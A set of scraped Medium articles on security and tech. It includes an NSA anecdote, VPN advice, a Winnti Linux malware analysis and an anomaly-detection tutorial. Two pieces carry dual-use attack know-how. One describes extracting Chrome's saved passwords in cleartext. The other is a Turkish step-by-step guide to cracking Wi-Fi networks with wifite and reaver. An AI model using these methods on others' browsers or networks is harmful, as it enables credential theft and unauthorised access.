I mention Dave was polite in asking for my code because it’s something that stood out and struck me as unusually odd — he was way too nice. He seemed predisposed or prepared for me to say no. And if it had been anyone else at any other time, he would have been right, but I could tell something big was up and there simply wasn’t time to debate the merits of handing over my source code to the NSA.
Of course, Dave asked right off if there was any chance there might be a back door to the encryption, as that would save a lot of time. But no. SafeHouse was designed to the highest standards and best practices using strong 256-bit industry-standard ciphers.
I’ll give you the source. Absolutely. Anything you need. No problem. But there actually was a tiny problem — I didn’t have it with me. I was on vacation. So I called and woke up Ron in Portland, OR. By then it was about 1am on the west coast. Ron was a programmer on my team and I knew he had a copy of the source at home.
Zipped. Emailed. Done.
I tried to probe — so, can you guys actually break 256-bit encryption? Dave was mum. Encryption insiders had always speculated about that; I figured it was worth a try. I didn’t really expect him to answer.
When did this laptop dude buy SafeHouse? What version did he have? The more I know, the more I can point you guys in the right direction.
And that’s when Dave let on that laptop dude had the shareware version. What — seriously? That changes everything. The shareware version only supported cheap 40-bit encryption — totally breakable within just a few days by most determined hackers; and likely, I’d assume, in quite a bit less time than that by the secret code breakers working in windowless rooms deep inside the NSA.
I probed again, this time about their capability at 40 bits; maybe that reduced level wasn’t such a State secret. But again, Dave was mum.
But seriously, this laptop idiot was planning to blow up a building, or something equally as bad, but wasn’t smart enough or flush enough to pop for the $39.99 to step up to the maximum-strength encryption?
This time Dave answered — “surprisingly, it happens all the time. They call them dumb criminals for a reason. Unbelievable, but true.”
I continued to work with Dave and his team over the next day or so. I answered all of their questions and they answered none of mine — naturally. But they were always polite in these one-sided conversations that fueled an insane curiosity that I knew would never be satisfied.
A few days later I was back home in California and an unmarked box showed up at my office addressed to me. Inside, wrapped in white tissue paper, was a blue NSA coffee cup with a hand-written note on plain white copy paper that simply said “Thank you. Dave.”
Later that day I got a call from Dave. He still couldn’t give me any details because it was all top secret, but he did tell me that everything “worked out” and they were grateful for my help.
Once more I tried to probe and asked if “worked out” meant they cracked the code; but of course, again, he wouldn’t say. Always so silent. He must be a hoot at parties. Is Dave even his real name?
As I thanked him for the gift, I couldn’t help not bust his chops about the covert note that he tucked inside the box. He just laughed and said “that’s my official NSA stationery.”
I’ve had that top secret coffee cup for 18 years now. It’s the same one pictured at the top of this article. I need my coffee every morning, but I’ve never used this cup. It’s too special. I’m afraid I’d break it if I started using it on a regular basis, so it stays up on a shelf in my living room alongside some of my other treasured mementos.
For all I know, they sell those cups in the gift shop.
I’ve never been to the NSA, and for all I know, they sell those cups in the gift shop. But to me it doesn’t matter. This cup is a reminder of something bad that never happened, and I played a small role in that.
But there’s still one thing that continues to nag me after all these years — how the hell did Dave track me down 3,000 miles away from home after midnight on that hot summer’s eve in Bristol, Connecticut?
Written by
","['About', 'Videos', 'Collaborate', 'Subscribe', 'AI', 'Resources', 'DDI Connect', 'Security', 'Encryption', 'Human Interest', 'Business', 'Cybersecurity']"
"Why VPNs Are Suddenly Everywhere, and How to Pick the Best One",https://onezero.medium.com/why-vpns-are-suddenly-everywhere-and-how-to-pick-the-best-one-22d4cfdeff6f?source=tag_archive---------1-----------------------,"If you’ve listened to a podcast lately, you might have noticed that the ads for Stamps.com and internet-order mattresses have been superseded by endless advertisements for virtual private networks (VPNs), all explaining how important it is to get a secure connection of your own.
VPN companies promise to help protect you, but how can you know which of the many available services are trustworthy? And why the heck do you suddenly need one?
First, the reason there are so many ads is that running a VPN can be a highly profitable business. All it takes is setting up a bunch of servers, in different locations, which are shared across hundreds of users and cost a few hundred dollars to operate. Then just sit back and watch the subscription fees roll in.
But doing a VPN right isn’t so easy.
Some quick background: You might already be familiar with a VPN if you’ve worked in a corporate job. A company’s VPN will usually allow you to remotely connect to the tools you use for your job as if you were sitting in your seat at the office.
Think of connecting to a VPN like teleporting from one internet connection to another. When I’m on a VPN, instead of connecting to Medium.com as Owen in Amsterdam, it looks like I’m Owen from New York or Owen from Toronto. A VPN makes it appear, to anyone who’s observing, that you’re accessing the internet from another computer, not the one in front of you.
Plenty of prying eyes can monitor what you do online, from the internet service provider (ISP) you’re paying to take you online, like Comcast, to the cafe Wi-Fi you’re leeching from — and it’s hard to be sure that any of those parties can be trusted. With a VPN, the internet provider or Wi-Fi company can’t tell where the traffic is from or where it’s headed. To them, it just looks like a blob of anonymous data, headed off to a server.
Paid VPN services offer features like the ability to route your traffic through a network in the country of your choosing, which is handy if you really want to watch HBO and it’s not available in your country. (Though note that content providers like Hulu will sometimes block VPN servers; quality VPN providers will refresh their offerings to help you avoid this.) Some services offer more on top, such as blocking ads before they load, or further anonymizing you.
Some VPNs pose as a way to get a secure connection, but actually log everything you do for marketing purposes.
Here’s the thing: It’s 2019 and there are fresh privacy scandals all the time. Handing over access to your raw, unfiltered traffic is one of the best ways for advertisers and bad actors to learn almost everything about you. And that leads to an important question to ask yourself before you pick a VPN service: “Is this company actually helping my data be more secure, or am I exposing myself to someone else monitoring me instead?”
As with everything online, there are plenty of scams masquerading as legitimate services. Some VPNs pose as a way to get a secure connection, but actually log everything you do for marketing purposes. And because VPN providers can see the traffic you send through their services, some may monitor your traffic and sell your browsing history to advertisers, in secret, to make more money. This is common among cheap or free services.
Facebook, for example, operated a VPN service called “Onavo” that was basically a virus. The social giant reportedly used it to suck up data about teens and use that information to clone or acquire its rivals. According to BuzzFeed, monitoring Onavo traffic helped Facebook measure WhatsApp’s popularity, and led to its ultimate acquisition in 2014 for $19 billion. (In response to these reports, the company said, “Market research helps companies build better products for people. We are shifting our focus to reward-based market research which means we’re going to end the Onavo program.”)
If you’re using a VPN that’s monitoring you, it’s probably not worth it in the first place. Cough up the money for a legit service. Here are the most important factors to check:
These are only basic questions, but as with all internet-connected things, your own choices about security will fall on a spectrum. My tolerance for risk is likely to be different from yours: I’m worried about angry readers or a rogue nation-state who might be annoyed about what I write and want to retaliate, so I’m willing to go through a lot of research and hassle to protect myself.
If you’re worried about getting HBO outside of the U.S., or entering your banking password on free Wi-Fi — and you should be worried — that means a different set of risks. You should think about who you’re trying to protect yourself against, and what risks are acceptable in exchange for convenience — a VPN that’s ultra-secure but impossible to use may not be what you’re looking for.
Meanwhile, Googling “the best VPN” won’t cut it, because most of the top results are actually a list of affiliate links, which gives the writer a cut if you sign up after clicking.
But there are independent services that collect worthwhile information and help you sort through it without affiliate links.
That One Privacy Site, for example, provides a detailed collection of VPN services around the world and measures their record on an incredible amount of metrics, while explaining why you should care about each. A quick scan of the list for the service you’re considering will help you understand what they’re actually protecting you against — or where you might be exposing yourself to unacceptable risk.
If that’s still a bit too much work for you, the next best resource is the Wirecutter’s ultimate guide, which is backed by the New York Times, and touts extensive research with thousands of data points, focusing on the best balance of privacy and security.
I wasn’t going to leave you hanging! I’ve read many reviews, checked the data, and decided for myself already — so here are my top picks if you just want a decent VPN service. These aren’t affiliate links, and neither I nor OneZero will financially benefit from your choice.
Best all-round: NordVPNIt’s consistently one of the best-reviewed VPN services. It’s based outside of U.S. jurisdiction in Panama, it hosts its own servers, uses proper encryption technology, doesn’t track user activity — and, crucially, it’s not a nightmare to use.
Out of all the VPN services I’ve used, NordVPN has a good balance of handy features — including the ability to block ads while you’re connected — and a serious amount of servers to connect through, with multiple available in each available country.
The company’s fees are a little higher than average, at $11.95 per month, but they get cheaper the longer you commit — it’s about $6.99 per month if you pay for three years up-front.
Easiest to use: IVPNFor most people, a VPN is a tool that should be easy to use and then forgotten about. IVPN, which is also recommended by Wirecutter, fits the bill. It’s simple to use regardless of platform, and it gets the job done.
While it doesn’t tick every box in terms of the balance between privacy and security, it covers many of the ones that count while balancing transparency in a way I haven’t seen with other services. It’s public about its ethics, who works there, and how it handles your data.
IVPN is a bit costly at $15 per month, or $5.83 with an annual commitment, but again, you get what you pay for.
Create your own VPNIf you know your way around computers and don’t want to trust some random company, I’m with you — sometimes it’s important to roll your own.
The good news is that it’s become really easy to generate your own ultra-cheap VPN in a few clicks, thanks to a project from Google’s parent company, Alphabet, called Outline. It’s intended to help protect journalists, but it’s free to use and ultra-simple to set up.
With Outline, you’ll have control of the VPN server that your traffic is sent through, but that means you’ll need to set it up, as well. You can do this for just $5 per month on a service like DigitalOcean, and Outline provides a one-line copy-and-paste tool to get set up.
It’s incredibly powerful to control your own server, because you know where the data will end up. But that comes at a cost: You need to keep it up to date, and you won’t have the freedom to switch countries on the fly, as you would with something like NordVPN. But sometimes the tradeoff is worth it — and at $5 per month, it’s a great option for those who have the time and skills to set it up.
Getting a VPN doesn’t need to be difficult, but advertisements that imply they’ll help magically fix privacy concerns are misleading at best, so I find myself suspicious of any VPN company with enough money to spend on splashy podcast ads.
You absolutely should get a VPN for yourself, even if it’s just for occasional use, but it’s important to know what’s going on behind the scenes. It can seem like a hassle, but VPNs are an incredibly useful tool for avoiding censorship, tracking, or just getting around country restrictions when you need to.
All it takes to make a better informed choice is a little bit of research. You’re doing yourself a favor, and it won’t come back to bite you later.
Written by
","['CONSUMER TECH', 'DIGITAL LIFE', 'INDUSTRY', 'SCIENCE & MEDICINE', 'ABOUT', 'SSH tunnels', 'VPN', 'Cybersecurity', 'Digital Life', 'Privacy', 'Debugger']"
Why we need RISC-V - HackerNoon.com - Medium,https://medium.com/hackernoon/why-we-need-risc-v-f94e3929891b?source=tag_archive---------9-----------------------,"The RISC-V (Reduced Instruction Set Computer) processor is a chip that is still in it’s infancy, but it’s a chip that everyone should be supporting. You might be wondering, what makes this chip so great?
The RISC-V architecture is great because it is the only processor that has a completely open source instruction set, if you want to learn more check out their website. What’s an open source instruction set? In layman’s terms, it means that the way the processor moves around 1s and 0s is available for everyone to see. The advent of what is probably the worst security bug, Meltdown and Spectre, boiled down to a flaw in the instruction set of Intel’s processors. I don’t think anyone in the security field was completely shocked, after all, a speaker at a BlackHat conference demonstrated that there were unknown instructions in the x86 architecture, and that inevitably means there are hidden bugs, it was only a matter of time before a truly devastating bug was found, in our case it was Spectre and Meltdown.
Another benefit of RISC-V is that it enables companies to develop a product that is tailored specifically to their workload, so they start with the RISC-V core and can add whatever it is they specifically need, saving both time and money. These savings can theoretically be passed on to the consumer either through a lower cost, or in the longterm by having a lower energy footprint. However, I believe the biggest benefit of RISC-V is the inherent security and peace of mind it will give to both consumers and businesses alike.
The Spectre and Meltdown bugs are huge problems in the security sphere because over 90% of the server market is owned by Intel, which means that nearly every cloud service is running on hardware that allows attackers to read data that they should not be able to access. To make matters worse, early reports indicate that after these bugs are patched, there will be a performance hit of anywhere between 4–30%, depending on the workload. I hope that these devastating new bugs will make everyone rethink how they go about designing hardware, and support products such as RISC-V.
I will confess that even if we all switched to RISC-V in the future, it doesn’t mean that all of our security woes will be left in the past, RISC-V is BSD licensed, meaning that a vendor can tailor it to themselves and keep those custom bits of code behind closed doors, and closed doors means that there is most likely a vulnerability waiting to be unearthed. The only way forward is with a future that is open and transparent, technology has become too ingrained in our society to be kept behind closed doors.
I’m a firm believer in open source because it’s the only way to achieve the kind of optimistic future that we want. AI that will be responsible for driving cars should be open for everyone to see what it does and how it works, processors that the AI runs on should be the same. As far as I know, RISC-V is the latest open source processor architecture that is currently being used or developed for a variety of products by multiple big name companies. (EDIT: ARM and SPARC are other open source processor designs) For example, Nvidia will be using a RISC-V chip onboard their GPUS and Western Digital is planning to ship a billion RISC-V units in the upcoming year. If you’re a tinkerer or someone who is a fan of small board computers such as Raspberry Pi’s or Arduino’s, SiFive, a company founded by a former student of the man who invented RISC, sells a RISC-V developer board right now.
RISC-V is an existing piece of technology with brilliant minds and monolithic companies propelling it forward, I hope that one day consumers and businesses alike will have easy access to this open architecture available on their laptops, phones, and desktops.
Written by
","['About', 'Help', 'Go Home', 'Risc V', 'Open Source', 'Cybersecurity', 'Intel', 'Predictions']"
Why You Should Never Save Passwords on Chrome or Firefox,https://medium.com/hackernoon/why-you-should-never-save-passwords-on-chrome-or-firefox-96b770cfd0d0?source=tag_archive---------4-----------------------,"In this article I will demonstrate how easy it is for hackers to extract every username and password saved on your Chrome profile. One would think that Chrome would have safety measures to encrypt your password, but apparently that is not the case — sorta. My Chrome profile, like many others, is set up so that there is another encryption password that I have to enter in order to sync all my passwords, bookmarks, settings, browser history, and etc. so it was pretty shocking to me how easy it was for me to extract and decrypt my passwords. Twelve lines of code easy.
Before we get started, I should mention that I have not tested this on macOS or any Linux distributions. To replicate this demonstration, you must be on a Windows environment with Python.
First let’s begin by importing all the dependencies required, and setting the folder location of your Chrome profile user data. Required dependencies: sqlite3 and win32crypt
Next, we will have to use sqlite3 to connect to the database where Chrome stores all your user data. Let’s take a look at the database structure. I used a free tool called SQLite Expert, but the choice of software is not important or even needed — I’m just a very visual guy.
From looking at the database table, three columns catch my attention: action_url, username_value, and password_value. Notice that password_value type is BLOB — it is encrypted, but with poor design (we’ll get to that in a bit).
From here we’ll make a simple SQL query to fetch the respective values and store them for decrypting.
If you get an error about the database being locked, it’s because another program (presumably the Chrome window that you’re reading this on �) already has the database opened. You’ll need to close all your Chrome windows and for good measure do a control+alt+delete to ensure that there’s no lingering Chrome services running.
The encrypted password that we’ve now collected was generated by a Windows function, CryptProtectData. The data can only be decrypted by a user with the same Windows login credentials, and the same computer it was encrypted on. Sounds super safe! Right?
Well, no. If a hacker has managed to get access to your computer, whether it be through an unprotected port or a botnet-type trojan that you’ve managed to get infected with, then the hacker already has your Windows credentials and the decrypting function would be run on your computer. And just as there’s CryptProtectData, there’s a CryptUnprotectData function, which we’ll be using to get the cleartext version of the passwords.
And that’s it. In just twelve lines of code, I’ve extracted all 588 saved passwords in cleartext dating back to 2011.
Other sensitive data, such as browsing history and cookies are also subject to easy extraction using similar methods.
I thought that using a different passwords for every website logins was sufficient enough to protect myself. This may be true for sites that offer 2-factor authentication, but the reality is that most sites have not yet integrated 2FA capabilities.
So how do we protect our passwords? It seems that a third-party password manager, which there are ton of in the market today, would be a smart choice (do your own research, because frankly I have not used them until now and can not offer a suggestion). One thing is clear, though — relying on Chrome to protect your passwords is a very, very bad idea.
I’ve got to admit, going through the list of passwords was like going through a trip down memory lane. Sites I’ve long forgotten about, accounts that I forgot about, and even a few cryptocurrency exchanges that I forgot I had funds in. Here’s a slightly longer version of this script that saves all the info into a text file for you to look at if you want to see your entire saved login data.
Disclaimer: I am not responsible for any idiot’s decision to misuse this script in any illegal or morally questionable way. This demonstration is strictly for educational purposes.
Written by
","['About', 'Help', 'Go Home', 'Security', 'Cybersecurity', 'Chrome', 'Passwords', 'Identity Theft']"
Winnti: More than just Windows and Gates - Chronicle Blog - Medium,https://medium.com/chronicle-blog/winnti-more-than-just-windows-and-gates-e4f03436031a?source=tag_archive---------5-----------------------,"The Winnti malware family was first reported in 2013 by Kaspersky Lab¹. Since then, threat actors leveraging Winnti malware have victimized a diverse set of targets for varied motivations. While the name ‘Winnti’ in public reporting was previously used to signify a single actor, pronounced divergence in targeting and tradecraft between campaigns has led industry consensus to break up the tracking of the continued use of the Winnti malware under different actor clusters. The underlying hypothesis² is that the malware itself may be shared (or sold) across a small group of actors.
In April 2019, reports³ emerged of an intrusion involving Winnti⁴ malware at a German Pharmaceutical company. Following these reports, Chronicle researchers doubled down on efforts to try to unravel the various campaigns where Winnti was leveraged. Analysis of these larger convoluted clusters is ongoing. While reviewing a 2015 report⁵ of a Winnti intrusion at a Vietnamese gaming company, we identified a small cluster of Winnti⁶ samples designed specifically for Linux⁷. The following is a technical analysis of this variant.
The Linux version of Winnti is comprised of two files: a main backdoor (libxselinux) and a library (libxselinux.so) used to hide it’s activity on an infected system.
As with other versions of Winnti, the core component of the malware doesn’t natively provide the operators with distinct functionality⁸. This component is primarily designed to handle communications and the deployment of modules directly from the command-and-control servers. During our analysis, we were unable to recover any active plugins. However, prior reporting⁹ suggests that the operators commonly deploy plugins for remote command execution, file exfiltration, and socks5 proxying on the infected host. We expect similar functionality to be leveraged via additional modules for Linux.
‘libxselinux.so’ — the userland rootkit
The library used to hide Winnti’s system activity is a copy of the open-source userland rootkit Azazel¹⁰, with minor changes. When executed, it will register symbols for multiple commonly used functions, including: open(), rmdir(), and unlink(), and modify their returns to hide the malware’s operations. Below is a side-by-side comparison of the Azazel source code and the relevant function decompilation from ‘libxselinux.so’.
Distinct changes to Azazel by the Winnti developers include the addition of a function named ‘Decrypt2’, which is used to decode an embedded configuration similar to the core implant. Unlike standard Azazel which is configured to hide network activity based on port ranges, the Winnti-modified version keeps a list of process identifiers and network connections associated with the malware’s activity. This modification likely serves to simplify the operator’s sample configuration process by not having to denote specific ports to hide.
Strings within this sample associated with the malware’s operations are encoded using a single-byte XOR encoding. The following is an example Python function to decode these strings.
libxselinux
Winnti Linux variant’s core functionality is within ‘libxselinux’. Upon execution, an embedded configuration is decoded from the data section using a simple XOR cipher. An example Python function to decode this configuration is shown below:
The decoded configuration is similar in structure to the version Kaspersky classifies as Winnti 2.0¹¹, as well as samples in the 2015 Novetta report¹². Embedded in this sample’s configuration three command-and-control server addresses and two additional strings we believe to be campaign designators. Winnti ver. 1, these values were designated as ‘tag’ and ‘group’. A sample decoded configuration is shown below:
Winnti Linux samples identified so far fall under three distinct campaign designators:
For context, embedded Winnti campaign designators have ranged from target names, geographic areas, industry, and profanity.
Winnti malware handles outbound communications using multiple protocols including: ICMP, HTTP, as well as custom TCP and UDP protocols. Use of these protocols is thoroughly documented in the Novetta and Kaspersky reports. While the outbound communication mechanisms are well documented, less attention has been paid to a feature of recent versions of Winnti we came across in the Linux variant (as well as Windows) that allows the operators to initiate a connection directly to an infected host, without requiring a connection to a control server.
This secondary communication channel may be used by operators when access to the hard-coded control servers is disrupted. Additionally, the operators could leverage this feature when infecting internet-facing devices in a targeted organization to allow them to reenter a network if evicted from internal hosts. This passive implant approach to network persistence has been previously observed with threat actors like Project Sauron and the Lamberts.
Initial technical information about this feature was shared by the Thyssenkrupp CERT in the form of an Nmap¹³ script¹⁴ that could be used to identify Winnti infections through network scanning. This script identifies infected hosts by first sending a custom hello packet, immediately followed by an encoded request for host information, and then parsing the response. The workflow of the script is diagrammed below:
The initial request, referred to as the helo/hello request in the Nmap script, is comprised of four DWORDs. The first three are generated by rand() and the fourth is computed based on the first and third. When received by a Winnti-infected host, it will validate the received packet and listen for a second inbound request containing tasking. A breakdown of this traffic is shown below.
This second request (Encoded Get System Information Request) is encoded using the same method as the custom TCP protocol used for communication with command-and-control servers, which uses a four-byte XOR encoding. Before acting on the request, Winnti will validate the third DWORD contains the magic value 0xABC18CBA before executing tasking.
While it may be possible to conduct broad scanning to identify infected systems, the results would likely only be the subset that are directly Internet accessible.
Clusters of Winnti-related activity have become a complex topic in threat intelligence circles, with activity vaguely attributed to different codenamed threat actors. The threat actors utilizing this toolset have repeatedly demonstrated their expertise in compromising Windows-based environments. An expansion into Linux tooling indicates iteration outside of their traditional comfort zone. This may indicate the OS requirements of their intended targets but it may also be an attempt to take advantage of a security telemitry blindspot in many enterprises, as is with Penquin Turla and APT28’s Linux XAgent variant. Utilizing a passive listener as a communications channel is characteristic of the Winnti developers’ foresight in needing a failsafe secondary command-and-control mechanisms. Chronicle researchers maintain an active interest in clusters of Winnti activity and our research is ongoing.
(Click here for source rule text and additional IoCs)
[1] However, Kaspersky researchers credited HBGary for prior analysis in 2010
[2]https://401trg.com/burning-umbrella/
[3]https://www.scmagazine.com/home/security-news/malware/pharma-firm-bayer-hit-with-winnti-malware/
[4]https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134508/winnti-more-than-just-a-game-130410.pdf
[5]https://blog.vsec.com.vn/apt/initial-winnti-analysis-against-vietnam-game-company.html
[6]As in the malware, not a reference to an actor group
[7]PwC researchers were aware of the Winnti Linux variant, as revealed in Kris McConkey’s SAS 2019 talk, “Skeletons in the supply chain”.
[8]https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134508/winnti-more-than-just-a-game-130410.pdf page 21
[9]https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134508/winnti-more-than-just-a-game-130410.pdf page 21
[10]https://github.com/chokepoint/azazel
[11] In the report Winnti: More than just a game
[12] https://www.novetta.com/wp-content/uploads/2015/04/novetta_winntianalysis.pdf
[13] https://nmap.org/
[14] https://github.com/TKCERT/winnti-nmap-script
Written by
",['Cybersecurity']
"With Nine Short Words, Google Just Made a Stunning Announcement That Will Change Everything You Think About Google",https://medium.com/inc./with-nine-short-words-google-just-made-a-stunning-announcement-that-will-change-everything-you-6db2a41d6892?source=tag_archive---------6-----------------------,"By Bill Murphy Jr.
Once upon a time, there was a company called Google. And it seemed invincible.
Written by
","['Google', 'Business', 'Social Media', 'Facebook', 'Cybersecurity']"
Wondering how to build an anomaly detection model? - Towards Data Science,https://towardsdatascience.com/wondering-how-to-build-an-anomaly-detection-model-87d28e50309?source=tag_archive---------2-----------------------,"Hey guys! Have you ever given a thought about how banks identify the fraudulent accounts? or how can you detect some faulty servers in your network? or how do you tackle problems in machine learning where you don’t have enough knowledge about your positive examples?
Well, you’ve landed in the right place. Anomaly detection is a technique used to identify unusual patterns that do not conform to expected behaviour, called outliers. It has many applications in business, from intrusion detection (identifying strange patterns in network traffic that could signal a hack) to system health monitoring (spotting a malignant tumour in an MRI scan), and from fraud detection in credit card transactions to fault detection in operating environments. Ok, Ok enough of the theory dude! Show some code man. Here we GO!!
Hmm…excited? Let’s get started.
So, we are making an anomaly detection model and apply it to detect failing servers on a network. Before going into the original dataset let’s first visualize how to proceed and carry out different functions. Let’s start by importing a few libraries.
We’ll be using a dummy dataset to check whether all the functions are working properly and we would then use these functions on our original dataset. Are we good? Now, we’ll import the dataset and one thing to note here is that the dataset should be in the same directory where your script is present.
sio.loadmat() loads our dataset(‘anomalyData.mat’) into the variable dataset. The variable ‘X’ contains the training dataset, ‘Xval’ the cross-validation set and ‘yval’ the corresponding output for the ‘Xval’. Let’s see the array ‘X’ that we are going to use to fit it in a Gaussian model to detect anomalous examples.
As you can see there are 307 training examples and each having 2 features. The features measure the throughput (mb/s) and latency (ms) of response of each server. While your servers were operating, you collected m = 307 examples of how they were behaving, and thus have an unlabeled dataset {x(1), . . . , x(m)}. You suspect that the vast majority of these examples are “normal” (non-anomalous) examples of the servers operating normally, but there might also be some examples of servers acting anomalously within this dataset. Now, let’s visualize the dataset to have a clear picture.
To perform anomaly detection, you will first need to fit a model to the data’s distribution. Given a training set {x(1), …, x(m)} (where x(i) ∈ R^n, here n = 2), you want to estimate the Gaussian distribution for each of the features. For each feature (i = 1 . . . n), you need to find parameters mean and variance(mu, sigma²). For doing that let’s write down the function that calculates the mean and variance of the array(or you can call it matrix) X.
The mathematical expression goes something like this:
We’ve got to calculate the mean for each feature and with the help of that, we calculate the variance of the corresponding features. Let’s put it into code.
Now that we have the mean and variance we need to calculate the probability of the training examples in order to decide which examples are anomalous. We can do it by using the Multivariate Gaussian model.
The multivariate Gaussian is used to find the probability of each example and based on some threshold value we decide whether to flag an anomaly or not. The expression for calculating the parameters for the Gaussian model are:
Here, mu is the mean of each feature and the variable sigma calculates the covariance matrix. These two parameters are used to calculate the probability p(x). ‘e’ is the threshold value that we are going to discuss in detail further. Once you understand the expression, the code is very simple to implement. Let’s see how to put it into code.
Inside the function, first, we convert the sigma2 vector into a covariance matrix and then we simply apply the formula for the multivariate distribution to get the probability vector. If you’ve passed a vector in sigma2 you’ve to convert it into a matrix with the vector as the diagonal and rest of the element as zero(line 6).
Thus, you’ve successfully calculated the probabilities. Next, you’ve to calculate to the threshold value using some labelled data. Let’s see how to do this.
We find the probabilities of ‘Xval’ to compare it with ‘yval’ for determining the threshold. Let’s find the threshold value.
First, we find the stepsize to have a wide range of threshold values to decide the best one. We use the F1 score method to determine the best parameters i.e bestepsilon and bestF1. Predict anomaly if pval<epsilon that gives a vector of binary values in the variable predict. F1 score takes into consideration precision and recall.
In line number 19 I’ve implemented a for loop to calculate the tp, fp, and fn. I’d love to hear from you if you could come out with some vectorised implementation for the Logic.
Precision = true positive/(true positive + false positive)
Recall = true positive /(true positive + false negative)
Best parameters are the ones in which the F1 score value is maximum.
Note: We are going to need a try-except block because there can be cases where we divide by zero to calculate precision and recall.
Now, we have the best epsilon value and we are now in a position to calculate the anomalies on the training data’s probability. We also call the anomalies as outliers.
We need to return the indices of the outliers to identify the faulty servers. This gives us a vector with binary entries where 1 means anomaly and 0 means normal.
So, the faulty servers were as mentioned above. We can also graphically spot the outliers.
Congratulations !! We’ve successfully tested all our functions and we can use them on some real dataset to find out the anomalies. Let’s finish what we’ve started.
The newDatset has 1000 examples each having 11 features. The ‘Xvaltest’ is the cross-validation set for the test samples and ‘yvaltest’ the corresponding labels. Now, do the same thing that you did for the dummy dataset.
Ptest contains the prediction for the test samples and pvaltest for the cross-validation set. The best epsilon value comes out to be the order of exp(-18).
Check for the Outliers:
Output:
Thus, there are 117 outliers and their corresponding indices are given as above.
I know that starting from scratch could be a messy thing sometimes but you would get to learn a lot of details if you do it from scratch. You could find the notebook here for the above project. I hope I could teach you something new and make sure you check out my repository I’ve made other projects like DigitRecognition, Clustering a bird’s image etc.
References: Machine learning by Andrew Ng
Written by
","['Data Science', 'Machine Learning', 'Programming', 'Visualization', 'AI', 'Journalism', 'More', 'Contribute', 'Machine Learning', 'Deep Learning', 'Data Science', 'Cybersecurity', 'Python']"
WPS Atak ile Wifi (Kablosuz) Ağ Şifrelerini Kırma (wifite.py),https://medium.com/@bkokkus/wps-atak-ile-wifi-kablosuz-a%C4%9F-%C5%9Fifrelerini-k%C4%B1rma-wifite-py-f8e4df35b9cc?source=tag_archive---------2-----------------------,"Öncelikle konuyu anlatmadan Türk Ceza Kanunu ‘muzun güzide bir maddesini sizinle paylaşmak istiyorum. (TCK 163. Madde)  public void tck163() { (1) Otomatlar aracılığı ile sunulan ve bedeli ödendiği takdirde yararlanılabilen bir hizmetten ödeme yapmadan yararlanan kişi, iki aydan altı aya kadar hapis veya adlî para cezası ile cezalandırılır.
(2) Telefon hatları ile frekanslarından veya elektromanyetik dalgalarla yapılan şifreli veya şifresiz yayınlardan sahibinin veya zilyedinin rızası olmadan yararlanan kişi, altı aydan iki yıla kadar hapis veya adlî para cezası ile cezalandırılır.
(3) (Ek: 2/7/2012–6352/83 md.) Abonelik esasına göre yararlanılabilen elektrik enerjisinin, suyun veya doğal gazın sahibinin rızası olmaksızın ve tüketim miktarının belirlenmesini engelleyecek şekilde tüketilmesi halinde kişi hakkında bir yıldan üç yıla kadar hapis cezasına hükmolunur. }  Şimdi yukarıda belirttiğim kanunu okuduğunuzda belki sizin için kolay gözüken, basit gelen bir şeyin ciddi cezalara sebebiyet vereceği unutmayın. Canınızı biraz sıktım ama gerçekleri bilmek doğru adımlar atmamızı kolaylaştıracaktır.   Kullanımı çok kolay olan ve bir çok işlemi kendisi yapan wifite.py programını inceleyeceğiz. Terminale wifite - -help yazarak programın kullanımı ve kullanabileceğimiz parametreler hakkında bilgi sahibi olabiliriz.
Programın işlevleri hakkında bilgi sahibi olduktan programı çalıştırmak için terminal ekranımıza  > wifite  yazıyoruz ve bekliyoruz.  Programımız başladı ve ilk olarak bizim kablosuz ağ arayüzümüzü monitör moduna alacak ve etraftaki ağları aramaya başlayacak. Aynı zamanda da bu bölümde bize dinamik olan tarama yapısının CTRL+C tuş kombinasyonu ile durdurulabileceğini söylüyor.
Bulduğu ağları ise bizim için her birine indis numarası vererek dinamik bir yapıda listeler taramaya ve yenilemeye devam eder. Aynı zamanda bu listede : CH : Kanal numarası ENCR : Şifreleme türü POWER : Modem bulunduğunuz noktadaki çekim gücü (desibel cinsinden). WPS : Bu kısım modemde wps özelliğinin olup olmadığını gösterir. CLIENT : Eğer bu kısımda client yazıyorsa o ağ üzerinde aktif olarak biri/birileri internet bağlıdır.
İstediğimiz ağı ya da ağları listelediğini düşünüyorsak CTRL+C tuş kombinasyonu ile durduruyoruz. Bulduğu hedef sayısını ve hangi hedefe yönelik atak yapılacaksa bunun başında ki numarayı (yani yukarıda sürekli bahsettiğim indis) yazıp enter tuşuna basıyoruz. Fakat burada birden fazla wifi adresine atak yapmak istiyorsanız numaraların arasına “,” (virgül) koyarak istediğiniz tüm hedefleri sıralayabilirsiniz. Aynı zamanda “all” yazarak listelenen tüm ağlara sırayla atak yapmasını isteyebiliriz. Ben birkaç hedefi tek seferde seçeceğim. Kendisine verdiğimiz indis numaralarına verdiğimiz sırada teker teker atak yapmaya başladı ve bulduğu şifreleri hemen altında belirterek diğer hedefine devam ediyor bu şekilde hedeflerinizi teker teker kırmaya devam ediyor.
Kırma işlemi bittiğinde kırdığı hedefleri /root/ dizini altında cracked.csv isimli bir dosya açarak kaydediyor. Burada Temel Hizmet Takımı Tanımlayıcısı , Kablosuz Ağ adı , Şifreleme Türü , Şifresi , WPS PIN numarası yazıyor.
NOT : İşleminiz bittikten sonra ağ bağlantılarını açmak için terminale :  > service network-manager start ardından da eğer kablosuz ağ bağlantınız gelmezse arayüzünüzü belirterek  > service network-manager start wlan0 yazın ağ aktif olacaktır.  NOT : Daha önce kırdığınız bir ağın şifresi değişmişse tekrar wifite ile atak yapmanıza gerek yok vakitte alıyorsa vakit kaybetmenize gerek yok reaver programını kullanarak wps pin yardımı ile en fazla 4 saniye de yeni şifreyi elde edebilirsiniz.  NOT : Cafe , Havaalanı vb.. yerlerde olan veya olabilen müşterilerin kayıt olarak veya sosyal medya üzerinden kayıt olunarak internete bağlanabilmenizi sağlayan router cihazları aynı zamanda internet bağlantısını aldıkları modem cihazlarını kayıt (log) altına alabiliyor. Aklınızın bir köşesinde bulusun! :)
iyi çalışmalar ..
Written by
","['Cybersecurity', 'Penetration Testing', 'Turkish', 'Hacking']"
